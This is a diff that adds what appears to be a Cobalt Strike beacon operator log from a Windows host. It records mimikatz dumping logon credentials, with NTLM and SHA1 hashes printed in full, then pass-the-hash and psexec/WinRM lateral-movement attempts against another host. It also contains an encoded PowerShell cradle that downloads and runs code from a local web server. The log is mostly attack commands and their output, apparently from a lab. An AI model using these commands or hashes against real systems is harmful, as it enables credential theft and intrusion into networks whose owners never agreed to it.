@@ -1,0 +1,279 @@
+03/09 14:48:16 UTC [metadata] 222.141.67.133 <- 100.100.1.22; computer: WIN-4O6MHEKI84B; user: SYSTEM *; process: artifact.exe; pid: 820; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+03/09 14:49:10 UTC [input] <test123> logonpasswords
+03/09 14:49:10 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+03/09 14:49:12 UTC [checkin] host called home, sent: 296058 bytes
+03/09 14:49:19 UTC [output]
+received output:
+
+Authentication Id : 0 ; 1228665 (00000000:0012bf79)
+Session           : RemoteInteractive from 2
+User Name         : Administrator
+Domain            : WIN-4O6MHEKI84B
+Logon Server      : WIN-4O6MHEKI84B
+Logon Time        : 2021/11/21 8:31:45
+SID               : S-1-5-21-814446333-3255057054-1420762169-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 47bf8039a8506cd67c524a03ff84ba4e
+	 * SHA1     : d2124cab9a30639bdb202a185264475a693a5481
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WIN-4O6MHEKI84B
+	 * NTLM     : 47bf8039a8506cd67c524a03ff84ba4e
+	 * SHA1     : d2124cab9a30639bdb202a185264475a693a5481
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WIN-4O6MHEKI84B
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WIN-4O6MHEKI84B
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 1 ; 276363539 (00000001:1078f913)
+Session           : RemoteInteractive from 3
+User Name         : admin$
+Domain            : WIN-4O6MHEKI84B
+Logon Server      : WIN-4O6MHEKI84B
+Logon Time        : 2022/3/9 22:17:29
+SID               : S-1-5-21-814446333-3255057054-1420762169-1025
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 0d7c9d3909c994cb7d7e8e4028184eac
+	 * SHA1     : 51948a6ebf25b1dfb9588405bca56ad9eaac13b5
+	 [00000003] Primary
+	 * Username : admin$
+	 * Domain   : WIN-4O6MHEKI84B
+	 * NTLM     : 0d7c9d3909c994cb7d7e8e4028184eac
+	 * SHA1     : 51948a6ebf25b1dfb9588405bca56ad9eaac13b5
+	tspkg :	
+	wdigest :	
+	 * Username : admin$
+	 * Domain   : WIN-4O6MHEKI84B
+	 * Password : (null)
+	kerberos :	
+	 * Username : admin$
+	 * Domain   : WIN-4O6MHEKI84B
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 1216436 (00000000:00128fb4)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:31:44
+SID               : S-1-5-90-2
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-4O6MHEKI84B$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 100060 (00000000:000186dc)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:02:55
+SID               : S-1-5-90-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-4O6MHEKI84B$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WIN-4O6MHEKI84B$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:02:53
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-4O6MHEKI84B$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-4o6mheki84b$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 67204 (00000000:00010684)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:02:52
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 1 ; 276351141 (00000001:1078c8a5)
+Session           : Interactive from 3
+User Name         : DWM-3
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 2022/3/9 22:17:29
+SID               : S-1-5-90-3
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-4O6MHEKI84B$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:02:59
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WIN-4O6MHEKI84B$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2021/11/21 8:02:52
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WIN-4O6MHEKI84B$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : win-4o6mheki84b$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+
+03/09 14:50:01 UTC [input] <test123> rev2self
+03/09 14:50:01 UTC [task] <T1134> Tasked beacon to revert token
+03/09 14:50:01 UTC [input] <test123> pth WIN-4O6MHEKI84B\Administrator 0d7c9d3909c994cb7d7e8e4028184eac
+03/09 14:50:01 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:WIN-4O6MHEKI84B /ntlm:0d7c9d3909c994cb7d7e8e4028184eac /run:"%COMSPEC% /c echo 0a1b680962f > \\.\pipe\d52135" command
+03/09 14:50:01 UTC [input] <test123> jump psexec WIN-4O6MHEKI84B smb
+03/09 14:50:02 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_7f) on WIN-4O6MHEKI84B via Service Control Manager (\\WIN-4O6MHEKI84B\ADMIN$\549e428.exe)
+03/09 14:50:02 UTC [indicator] service: \\WIN-4O6MHEKI84B 549e428
+03/09 14:50:02 UTC [indicator] file: 48afcd3f2b226a02323b9656e4ff6062 285696 bytes \\WIN-4O6MHEKI84B\ADMIN$\549e428.exe
+03/09 14:50:04 UTC [checkin] host called home, sent: 583958 bytes
+03/09 14:50:07 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+03/09 14:50:08 UTC [output]
+received output:
+Started service 549e428 on WIN-4O6MHEKI84B
+
+03/09 14:50:27 UTC [error] Could not connect to pipe: 231
+03/09 14:50:28 UTC [output]
+received output:
+user	: Administrator
+domain	: WIN-4O6MHEKI84B
+program	: C:\Windows\system32\cmd.exe /c echo 0a1b680962f > \\.\pipe\d52135
+impers.	: no
+NTLM	: 0d7c9d3909c994cb7d7e8e4028184eac
+  |  PID  21408
+  |  TID  19356
+  |  LSA Process is now R/W
+  |  LUID 1 ; 288499541 (00000001:11322755)
+  \_ msv1_0   - data copy @ 00000071E07A7790 : OK !
+  \_ kerberos - 
+
+
+03/09 14:52:01 UTC [input] <test123> rev2self
+03/09 14:52:01 UTC [task] <T1134> Tasked beacon to revert token
+03/09 14:52:01 UTC [input] <test123> pth WIN-4O6MHEKI84B\Administrator 0d7c9d3909c994cb7d7e8e4028184eac
+03/09 14:52:01 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:WIN-4O6MHEKI84B /ntlm:0d7c9d3909c994cb7d7e8e4028184eac /run:"%COMSPEC% /c echo c9369bb0564 > \\.\pipe\061028" command
+03/09 14:52:01 UTC [input] <test123> jump psexec 100.100.1.100 smb
+03/09 14:52:01 UTC [task] <T1035, T1050, T1077> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_7f) on 100.100.1.100 via Service Control Manager (\\100.100.1.100\ADMIN$\c5acb56.exe)
+03/09 14:52:01 UTC [indicator] service: \\100.100.1.100 c5acb56
+03/09 14:52:01 UTC [indicator] file: 9c84b5698b37de67ad1fd58ea9df92ab 285696 bytes \\100.100.1.100\ADMIN$\c5acb56.exe
+03/09 14:52:06 UTC [checkin] host called home, sent: 583948 bytes
+03/09 14:52:08 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+03/09 14:52:09 UTC [error] could not upload file: 1326
+03/09 14:52:09 UTC [error] Could not open service control manager on 100.100.1.100: 5
+03/09 14:52:24 UTC [input] <test123> rev2self
+03/09 14:52:24 UTC [task] <T1134> Tasked beacon to revert token
+03/09 14:52:24 UTC [input] <test123> pth WIN-4O6MHEKI84B\Administrator 0d7c9d3909c994cb7d7e8e4028184eac
+03/09 14:52:24 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:Administrator /domain:WIN-4O6MHEKI84B /ntlm:0d7c9d3909c994cb7d7e8e4028184eac /run:"%COMSPEC% /c echo 0c70da70539 > \\.\pipe\71499a" command
+03/09 14:52:24 UTC [input] <test123> jump winrm 100.100.1.100 smb
+03/09 14:52:25 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_7f) on 100.100.1.100 via WinRM
+03/09 14:52:26 UTC [error] Could not connect to pipe: 1326
+03/09 14:52:26 UTC [output]
+received output:
+user	: Administrator
+domain	: WIN-4O6MHEKI84B
+program	: C:\Windows\system32\cmd.exe /c echo c9369bb0564 > \\.\pipe\061028
+impers.	: no
+NTLM	: 0d7c9d3909c994cb7d7e8e4028184eac
+  |  PID  17560
+  |  TID  21188
+  |  LSA Process is now R/W
+  |  LUID 1 ; 290411807 (00000001:114f551f)
+  \_ msv1_0   - data copy @ 00000071DF747370 : OK !
+  \_ kerberos - 
+
+
+03/09 14:52:31 UTC [checkin] host called home, sent: 490499 bytes
+03/09 14:52:33 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+03/09 14:52:33 UTC [error] could not spawn powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAyADkANwAwADgALwAnACkA (token): 2
+03/09 14:52:50 UTC [error] Could not connect to pipe: 1326
+03/09 14:52:50 UTC [output]
+received output:
+user	: Administrator
+domain	: WIN-4O6MHEKI84B
+program	: C:\Windows\system32\cmd.exe /c echo 0c70da70539 > \\.\pipe\71499a
+impers.	: no
+NTLM	: 0d7c9d3909c994cb7d7e8e4028184eac
+  |  PID  20904
+  |  TID  18500
+  |  LSA Process is now R/W
+  |  LUID 1 ; 290662576 (00000001:115328b0)
+  \_ msv1_0   - data copy @ 00000071DF747AF0 : OK !
+  \_ kerberos - 
+
+
+03/09 15:11:37 UTC [checkin] host called home, sent: 1522 bytes
